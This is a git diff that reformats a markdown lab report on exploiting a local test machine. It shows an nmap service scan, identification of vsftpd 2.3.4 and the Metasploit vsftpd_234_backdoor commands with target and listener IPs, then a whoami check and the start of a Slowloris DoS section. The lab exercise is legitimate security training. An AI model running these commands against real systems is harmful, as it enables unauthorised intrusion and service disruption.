@@ -32,7 +32,7 @@ To perform system exploitation and simulate a denial-of-service (DoS) attack usi
 
 ---
 
-# Part 1: System Exploitation
+# PART 1: System Exploitation
 
 ##  Target Identification
 
@@ -40,9 +40,13 @@ The target system IP address was identified within the local lab network.
 
 ---
 
-##  Network Scanning
+###  Network Scanning
 
-nmap -sV 192.168.222.131 
+Command Used:
+
+```
+nmap -sV 192.168.222.131
+```
 
 ### Scan Result
 
@@ -58,18 +62,27 @@ The scan revealed open ports and services, including a vulnerable FTP service.
 
 The FTP service was identified as:
 
+```
 * vsftpd 2.3.4
+```
 
 This version contains a known vulnerability.
 
 ---
 
 ##  Exploitation
-
+```
 use exploit/unix/ftp/vsftpd_234_backdoor
+```
+```
 set RHOSTS 192.168.222.131 
+```
+```
 set lhost 192.168.222.129
+```
+```
 run
+```
 
 ![metasploit-exploitation](screenshots_exploit.png)
 
@@ -89,7 +102,7 @@ whoami
 
 ---
 
-# Part 2: DOS Simulation (Slowloris)
+# PART 2: DOS Simulation (Slowloris)
 
 ## Objective
 
